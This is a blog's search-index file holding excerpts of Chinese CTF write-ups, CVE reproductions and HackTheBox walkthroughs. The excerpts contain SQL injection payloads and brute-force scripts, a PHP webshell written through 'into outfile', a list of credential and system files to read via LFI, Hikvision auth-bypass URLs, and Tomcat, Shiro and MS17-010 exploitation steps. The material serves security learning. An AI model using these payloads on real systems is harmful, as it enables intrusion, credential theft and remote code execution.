var store = [{
        "title": "Ciscn2019 华北赛区 day2 web1 - hack world",
        "excerpt":"Ciscn2019 华北赛区 day2 web1 - hack world 0x00 题目描述 很明显这是一道sql注入的题目，已经给出了flag所在的列名和表名，且提供一个id查询的功能。当提交1和2的时候，查询出了两句骚话 Hello, glzjin wants a girlfriend. Do you want to be my girlfriend? 0x01 Capture The Flag 尝试输入一些常规的sql注入语句，结果都被过滤了，尝试异或注入，输入1^1^1，返回了id=1的结果 SQL中的^是异或判断，当^两边相同的时候，其值为0，当^两边不相同时，其值为1 1^1=0 1^2=1 所以我们可以通过输入1^(ascii(substr((select(flag)from(flag)),1,1))&gt;x)^1，不断改变x的值，根据回显逐渐爆破出flag的值。因为本萌新还不会写脚本，所以用了一下赵师傅的脚本 import requests url = \"http://web43.buuoj.cn/index.php\" result = '' for i in range(1, 38): for j in range(0, 256): payload...","categories": ["ctf"],
        "tags": ["sqli","web","ctf"],
        "url": "/ctf/hackworld/",
        "teaser": null
      },{
        "title": "极客大挑战2019 - SQLI",
        "excerpt":"极客大挑战2019 - SQLI 0x00 题目描述 极客大挑战2019的sql注入系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客 0x01 EasySQL 这题没什么好说的，万能密码一试就成功了 网站做的确实非常精湛！！ 0x02 LoveSQL 用上面的万能密码登录进去后，没有flag，而是给出了一串密码，让人不禁联想到sql查询。在加上登录界面的提示，可以判断flag应该在数据库的某个地方 接下来在输入用户名处拼接常规的sql注入语句就行了，payload可以参考 #爆出所有库名 ?id=0 union select 1,group_concat(distinct table_schema) from information_schema.columns #爆出数据库news的所有表名 ?id=0 union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema = 'news' #爆出表admin的所有列 ?id=0 union select 1,group_concat(distinct column_name) from information_schema.columns where table_name = 'admin' #查username和password，中间用:隔开 ?id=0 union select...","categories": ["ctf"],
        "tags": ["sqli","web","ctf"],
        "url": "/ctf/geekchall/",
        "teaser": null
      },{
        "title": "强网杯2019 - 随便注",
        "excerpt":"强网杯2019 - 随便注 0x00 关于堆叠注入 堆叠注入的危害很大，可以用于执行任何SQL语句。 在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，那么这条语句也可以被执行 #执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。 mysql&gt; select * from users where id =1;delete from users; 堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现 让我们一起来看一下这道题的三种思路吧 :) 0x01 方法一：重命名+堆叠注入 发现可以利用 or 把表中所有数据都查询出来，但是并没有我们需要的flag 先看一下库名，发现很多函数都被过滤了 尝试一下堆叠注入，果然可以，把全部数据库名给查出来了 继续查表名 查看表结构 ，可以发现flag在1919810931114514表里 0';desc `1919810931114514`;# 注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符 eg. mysql&gt; SELECT * FROM `table` WHERE `id` = '123'; 1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关 再查看words表的结构，发现一共有id和data两列 0';desc words;# 那么可以猜测我们提交查询的窗口就是在这个表里查询数据的，查询语句很有可能是 :...","categories": ["ctf"],
        "tags": ["ctf","web","sqli","mysql"],
        "url": "/ctf/shubianzhu/",
        "teaser": null
      },{
        "title": "GXYCTF2019 - Babysqli",
        "excerpt":"GXYCTF2019 - Babysqli 这道题肯定让很多人都一头雾水，不知道怎么下手，其实这道题和 WeChall 里的一道题基本相同，考察的是用户名和密码分开检验。高血压的这道题和 WeChall 的 Training: MySQL II 解题思路互通，Payload也互通。 大家如果去做一下 WeChall 的下面这两道题的话，做这道题的思路就会清晰很多。 给出两道题的地址： Training: MySQL I Training: MySQL II 然后再来简单讲讲这道题， 首先我们可以看到返回密码错误的页面源码里有一串字符串，base32再base64解密之后是 select * from user where username = '$name' 然后用常规注入的手段可以测出user这个表一共有三列，猜测分别为id，username，password。 之前我们有提到这道题考的是用户名和密码分开检验，也就是说它是先检验username，把username对应的所有字段都查出来后，再检验密码能不能和查出来的密码对上，检验密码的过程可能会有一个md5的加密。 登录验证的流程已经说清楚了，先做一个小测试。 用mysql创一个表叫user，创建三个列 id，username，password，这时如果执行一个查询语句：select * from user where username = 0 union select 1,’admin’,md5(‘abc’); 则会返回以下结果： 这样的话思路就很清晰了，我们先在用户名处输入1' union...","categories": ["ctf"],
        "tags": ["ctf","web","sqli"],
        "url": "/ctf/babysqli/",
        "teaser": null
      },{
        "title": "SWPU2019 - Web1",
        "excerpt":"SWPU2019 - Web1 0x00 前言 通过这道ctf题目记录一下两个比较实用的 trick 0x01 MariaDB特性 Maria数据库的这个表可以查表名： mysql.innodb_table_stats About MariaDB 成立于2009年，MySQL之父Michael “Monty” Widenius用他的新项目MariaDB完成了对MySQL的“反戈一击”。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。 过去一年中，大型互联网用户以及Linux发行商纷纷抛弃MySQL，转投MariaDB阵营。MariaDB是目前最受关注的MySQL数据库衍生版，也被视为开源数据库MySQL的替代品。 0x02 无列名注入 创建一个数据库叫 testdb，再创一个 user 表，结构如下： 往这个表里插入一些数据： mysql&gt; insert into user values(1,'admin','778778'),(2,'Artd33','123520'); 正常查询： mysql&gt; select * from user; 这时再使用一个union查询： mysql&gt; select 1,2,3 union select * from user; 利用数字3代替未知的列名，需要加上反引号。后面加了一个a是为了表示这个表（select 1,2,3 union select * from...","categories": ["ctf","tricks"],
        "tags": ["mariadb","sqli","mysql"],
        "url": "/ctf/tricks/web1/",
        "teaser": null
      },{
        "title": "除了information_schema之外几个可以利用的表",
        "excerpt":"除了information_schema之外几个可以利用的表  0x00 前言  information_schema.tables、information_schema.columns是在sql注入中最最最常见的可利用的表了。如果information_schema被过滤了怎么办？接下来看看MySQL下还有哪些可以利用的表   0x01 mysql.innodb_table_stats  当 “or” 被过滤了导致information_schema不能用时，我们可以用mysql.innodb_table_stats这个表来获取库名、表名      0x02 sys.schema_table_statistics  显然，当 “in” 被过滤时，information_schema 和 mysql.innodb_table_stats 同时也被过滤了。这时可以用sys.schema_table_statistics来获取库名、表名      0x03 sys.x$statement_analysis  这个表很有意思，其中有一列叫做query，select query from sys.x$statement_analysis 查询一下可以看到一些之前执行过的mysql语句。打ctf的时候说不定能利用这个表看到其他选手(dalao)的操作      0x04 参考  https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952 https://nosec.org/home/detail/3830.html  ","categories": ["tricks"],
        "tags": ["mysql","sqli"],
        "url": "/tricks/mysql/",
        "teaser": null
      },{
        "title": "GXYCTF2020 - Ezsqli",
        "excerpt":"GXYCTF2020 - Ezsqli 0x00 判断注入类型 先测试一下，发现过滤了 union select, or 等等，报错注入也没用。输入 1&amp;&amp;1=1 和输入1&amp;&amp;1=2 时，发现回显不同，所以存在布尔盲注。 0x01 利用sys.schema_table_statistics爆表名 因为or、in被过滤了，所以information_schema.columns不能用了，这时候我们可以利用sys.schema_table_statistics这个表。 写个脚本： import requests flag='' url='http://ca5cdac5-e97e-42df-9ed0-233bc75b4c4d.node3.buuoj.cn/index.php' for i in range(1,50): for j in range(33,127): payload = \"1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),\"+str(i)+\",1))=\"+str(j)+\"\" data={ 'id': payload } r=requests.post(url,data=data) if 'Nu1L' in r.text: flag=flag+chr(j) print(flag) break 0x02 无列名注入...","categories": ["ctf"],
        "tags": ["mysql","sqli","ctf"],
        "url": "/ctf/ezsqli/",
        "teaser": null
      },{
        "title": "GYCTF2020 - EasyThinking",
        "excerpt":"GYCTF2020 - EasyThinking ThinkPHP6.0.0-6.0.1任意文件操作漏洞 随便测试一下发现框架是Tp6，就很容易让人想到前阵子爆出的Tp6由于sessionId处理不当造成的任意文件操作漏洞。 漏洞分析：https://paper.seebug.org/1114/ 代码审计&amp;&amp;文件上传 目录扫描之后发现 www.zip，下载之后审计一下 public function search() { if (Request::isPost()){ if (!session('?UID')) { return redirect('/home/member/login'); } $data = input(\"post.\"); $record = session(\"Record\"); if (!session(\"Record\")) { session(\"Record\",$data[\"key\"]); } else { $recordArr = explode(\",\",$record); $recordLen = sizeof($recordArr); if ($recordLen &gt;= 3){ array_shift($recordArr); session(\"Record\",implode(\",\",$recordArr) . \",\" . $data[\"key\"]);...","categories": ["ctf"],
        "tags": ["web","thinkphp","ctf","php"],
        "url": "/ctf/easythinking/",
        "teaser": null
      },{
        "title": "Linux - 查看和修改文件权限",
        "excerpt":"查看文件权限  在linux操作系统中使用ls -l可以看到当前目录下文件或者文件夹的一些详细信息      第1个字符代表文件类型     第2~10个字符表示文件权限  r表是读 (Read) 、w表示写 (Write) 、x表示执行 (Execute)     前三个表示文件拥有者的权限   中间三个表示文件所属组拥有的权限   后三个表示其他用户拥有的权限   比如这张图片表示无论是文件拥有者还是所属组或者是其他用户，都有读写权限。另外，图中的两个 root 分别代表文件的拥有者和文件所属组。      修改文件权限   方式一  chmod [-R]  xyz 文件或目录     xyz分别为拥有者和所属组和其他用户所具有的权限的数值表示   各权限所代表的的数据r:4   w:2  x:1  eg. -rwxrwx---    owner=rwx=4+2+1=7  group=rwx=4+2+1=7 others=---=0+0+0=0   770  方式二  chmod [-R] u=rwx,g=rx,o=r  文件或目录     修改文件所属用户和组  chown [-R] root 文件或目录 //改用户  chgrp  [-R] root 文件或目录 //改所属组  ","categories": ["linux-tricks"],
        "tags": ["linux"],
        "url": "/linux-tricks/chmod/",
        "teaser": null
      },{
        "title": "写下服务器的笔记",
        "excerpt":"写下服务器的笔记 前言 最近买了一年的国内某云的服务器。这篇文章主要记录一下我在这台服务器上做的事情，避免以后采坑。操作系统是Ubuntu18.04，持续更新。 换源 备份源文件 $ sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 更改文件权限使其可编辑 $ sudo chmod 777 /etc/apt/sources.list Ubuntu 18.04 阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports...","categories": ["linux-tricks"],
        "tags": ["linux"],
        "url": "/linux-tricks/server/",
        "teaser": null
      },{
        "title": "Linux - Crontab",
        "excerpt":"简介 最近在打CTF的时候了解到了/etc/crontab这个文件，借机了解一下。通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本，精确到分。 命令格式 crontab [-u user] file crontab [-u user] [ -e | -l | -r ] 命令参数 Crontab分类 系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存。文件存放在 /etc/crontab 中。 个人执行的工作：某个用户定期要做的工作，例如每隔10分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置 。各用户的crontab文件存放在/var/spool/cron目录 日志文件 如果运行出错，linux会发邮件到 /var/mail/mail 或者 /var/spool/mail/mail 使用实例 每5分钟执行一次 /reset.sh */5 * * * * sh /reset.sh 每晚21: 30重启 cron 30 21 * * *...","categories": ["linux-tricks"],
        "tags": ["linux"],
        "url": "/linux-tricks/crontab/",
        "teaser": null
      },{
        "title": "LFI - 可利用敏感文件",
        "excerpt":"windows C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php配置信息 C:\\Windows\\my.ini //Mysql配置信息 linux /etc/passwd /etc/shadow /etc/hosts /root/.bash_history //root的bash历史记录 /root/.ssh/authorized_keys /root/.mysql_history //mysql的bash历史记录 /root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx的配置文件 /var/www/html/index.html /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd的配置文件 /proc/self/fd/fd[0-9]*(文件标识符) /proc/mounts /porc/config.gz /proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用 /proc/mounts // 挂载的文件系统列表 /proc/net/arp //arp表，可以获得内网其他机器的地址 /proc/net/route //路由表信息 /proc/net/tcp and /proc/net/udp...","categories": ["tricks"],
        "tags": ["lfi","windows","linux"],
        "url": "/tricks/lfi-files/",
        "teaser": null
      },{
        "title": "Redis未授权访问实战",
        "excerpt":"Redis未授权访问实战 0x00 前言 最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。 0x01 Redis简介 简单来说，Redis是一种数据库。 Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 Redis和mysql的区别： https://www.hzpady.com/a/2119.html 0x02 漏洞原理（产生条件） redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 没有设置密码认证，可以免密码登入redis服务。 0x03 漏洞利用 方法1 利用redis写webshell（条件是知道web目录的绝对路径，并有读写权限） 先下载个Redis 在redis官网上看到可以docker pull，那岂不乐哉。 $ docker search redis $ docker pull redis 只需两条命令，redis已成为我的囊中之物 接下来运行容器 $ docker run -d -p 6379:6379 --name redis redis 用ps命令可以看到redis已经部署到了我的6379端口了 刚刚学了Redis未授权访问漏洞，那我自己不会也可以被x了吧？于是我扫了一下自己，并没有发现6379端口开放，那我应该还是安全的。而且好像如果被x了，x的应该也是我的docker容器才对！ 下一步进入容器 $ docker...","categories": ["vul"],
        "tags": ["redis","unauthorized","linux","ssh"],
        "url": "/vul/Redis/",
        "teaser": null
      },{
        "title": "CVE-2016-4437 - Shiro反序列化",
        "excerpt":"CVE-2016-4437 - Shiro反序列化  0x00 漏洞概述  Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。   0x01 影响范围   Apache Shiro &lt;=1.2.4   0x02 环境搭建  使用vulhub搭建环境  $ docker-compose up -d     0x03 漏洞原理  Shiro的身份认证工作流程：   通过前端传入的值–&gt;获取remenberMe cookie–&gt;base64加密–&gt;AES加密–&gt;反序列化   以上流程中AES加密的密钥存在padding oracle攻击及密钥泄露。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞   0x04 漏洞检测   尝试登录，登录的返回包中有rememberMe=deleteMe字段      或者不登录，发送一个GET请求登录页面的包，把cookie改成rememberMe=1，返回包中也存在rememberMe=deleteMe字段      则可判断使用了shiro框架，接下来使用工具ShiroExploit 检测是否存在shiro反序列化漏洞   https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51      当命令框可输入，代表存在漏洞      可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell      ","categories": ["vul"],
        "tags": ["shiro","unserialize","web","rce"],
        "url": "/vul/CVE-2016-4437/",
        "teaser": null
      },{
        "title": "MS17-010 - 永恒之蓝",
        "excerpt":"MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 0x01 影响版本 WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0 0x02 环境搭建 靶机winXP（关闭防火墙） 192.168.32.131 攻击机kali 192.168.32.128 0x03 漏洞检测 通过nmap的扫描可以看到445端口是开着的，永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞 打开msf，搜索ms17-010 选中auxiliary/scanner/smb/smb_ms17_010这个模块，扫描C断存在漏洞的主机 用到的命令： $ msfconsole $ search ms17-101 $ use 1 $ show options $ set rhost 192.168.32.0/24 $ run 结果显示靶机存在漏洞...","categories": ["vul"],
        "tags": ["windows","smb","msf","rce"],
        "url": "/vul/ms17-010/",
        "teaser": null
      },{
        "title": "CVE-2017-7921 - Hikvision摄像头越权访问",
        "excerpt":"body=”laCurrentLanguage” &amp;&amp; country=”CN” 查看用户列表 /Security/users?auth=YWRtaW46MTEK 获取监控快照 /onvif-http/snapshot?auth=YWRtaW46MTEK 下载配置文件 /System/configurationFile?auth=YWRtaW46MTEK 解码配置文件 https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor 安装脚本依赖文件 sudo python3 -m pip install pycryptodome 解码，可得到用户名和密码 ./decrypt_configurationFile.py &lt;nameofdownloadedconfig&gt; CVE-2021-36260-HikvisionRCE: # Exploit Title: Hikvision Web Server Build 210702 - Command Injection # Exploit Author: bashis # Vendor Homepage: https://www.hikvision.com/ # Version: 1.0 # CVE: CVE-2021-36260 # Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html...","categories": ["vul"],
        "tags": ["hikvision","unserialize"],
        "url": "/vul/CVE-2017-7921/",
        "teaser": null
      },{
        "title": "SQL注入Getshell的几种方式",
        "excerpt":"SQL注入Getshell的几种方式 SQL注入不仅阔以导致数据泄露，也有阔能getshell哦 0x01 into outfile $ show global variables like '%secure%'; $ select '&lt;?php eval($_POST[yyj]);?&gt;' into outfile \"C/phpstudy/www/shell.php\"; $ sqlmap -u xxx --sql-shell $ select @@datadir; #查看文件路径（mysql/data的路径，根目录一般与mysql处于同一目录） $ select @@secure_file_priv; 0x02 sqlmap –os-shell 1.原理 –os-shell就是使用udf提权获取webshell。也是通过into outfile向服务器写入两个文件，一个可以直接执行系统命令，另一个可以上传文件。需要知道网站根目录以及数据库dba权限。 $ sqlmap -u xxx --os-shell 0x03 写日志 尝试用日志写入木马getshell不需要secure_file_priv没有具体值，但是需要知道网站根目录。 $ show global variables like '%general%'...","categories": ["tricks"],
        "tags": ["sqli","web","mysql"],
        "url": "/tricks/sqli-getshell/",
        "teaser": null
      },{
        "title": "CVE-2017-12615 - Tomcat任意文件写入",
        "excerpt":"CVE-2017-12615 - Tomcat任意文件写入 环境搭建 用vulhub的环境 查看配置文件conf/web.xml中readonly的设置 漏洞复现 访问主页，抓包后修改数据包 可通过 PUT 方式创建一个 JSP 文件。虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/）来绕过了限制。 改完包的时候不知道为啥上传失败了，于是我换了buuoj的环境，上传冰蝎的jsp木马，返回201代表上传成功 再用冰蝎连接即可 Windows服务器上搭建的tomcat可以在文件尾部加上 %20或者 ::$DATA等绕过 POC &amp;&amp; EXP #CVE-2017-12615 POC import requests import optparse import os parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') parse.add_option('-f',dest='FILE',help='target list') options,args =...","categories": ["vul"],
        "tags": ["tomcat","web"],
        "url": "/vul/CVE-2017-12615/",
        "teaser": null
      },{
        "title": "CVE-2020-1938 - Ghostcat",
        "excerpt":"CVE-2020-1938 - Ghostcat 0x00 漏洞概述 Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat 是由长亭发现的存在于 Tomcat 中的漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 0x01 影响范围 Tomcat 9.x &lt; 9.0.31 Tomcat 8.x &lt; 8.5.51 Tomcat 7.x &lt; 7.0.100 Tomcat 6.x 0x02 环境搭建（vulhub） 0x03 漏洞检测...","categories": ["vul"],
        "tags": ["tomcat","web","ajp","lfi"],
        "url": "/vul/CVE-2020-1938/",
        "teaser": null
      },{
        "title": "HackTheBox - Holiday",
        "excerpt":"HackTheBox - Holiday About Holiday Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning...","categories": ["hack-the-box"],
        "tags": ["node","linux","web","sqli","xss","rce","privilege-escalation"],
        "url": "/hack-the-box/holiday/",
        "teaser": null
      },{
        "title": "HackTheBox - Lame",
        "excerpt":"HackTheBox - Lame About Lame Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. Nmap 扫一下端口 ┌──(kali㉿kali)-[~/htb/lame] └─$ cat nmap.txt # Nmap...","categories": ["hack-the-box"],
        "tags": ["linux","msf","samba","rce","smb"],
        "url": "/hack-the-box/lame/",
        "teaser": null
      },{
        "title": "HackTheBox - Brainfuck",
        "excerpt":"HackTheBox - Brainfuck About Brainfuck Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many. Nmap ┌──(kali㉿kali)-[~/htb/Brainfuck] └─$ cat nmap.txt #...","categories": ["hack-the-box"],
        "tags": ["linux","web","wordpress","smtp","vigenere","ssh","privilege-escalation"],
        "url": "/hack-the-box/brainfuck/",
        "teaser": null
      },{
        "title": "HackTheBox - Active",
        "excerpt":"HackTheBox - Active About Active Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment. Nmap # Nmap 7.93 scan initiated Mon Aug 14 07:08:47 2023 as: nmap -n -v -sC -sS -sV --min-rate=1500 -oN nmap.txt 10.10.10.100 Increasing...","categories": ["hack-the-box"],
        "tags": ["windows","active-directory","smb"],
        "url": "/hack-the-box/active/",
        "teaser": null
      },{
        "title": "HackTheBox - Legacy && Blue",
        "excerpt":"HackTheBox - Legacy &amp;&amp; Blue HackTheBox - Legacy About Legacy Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access. Nmap # nmap -n -v -sC -sV --min-rate=1500 10.10.10.4 再用nmap自带的smb漏扫脚本去扫描，扫描出了ms17-010以及ms08-067漏洞 # nmap...","categories": ["hack-the-box"],
        "tags": ["windows","smb","msf"],
        "url": "/hack-the-box/legacy-blue/",
        "teaser": null
      },{
        "title": "HackTheBox - Forest",
        "excerpt":"HackTheBox - Forest About Forest Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled...","categories": ["hack-the-box"],
        "tags": ["windows","active-directory"],
        "url": "/hack-the-box/forest/",
        "teaser": null
      }]
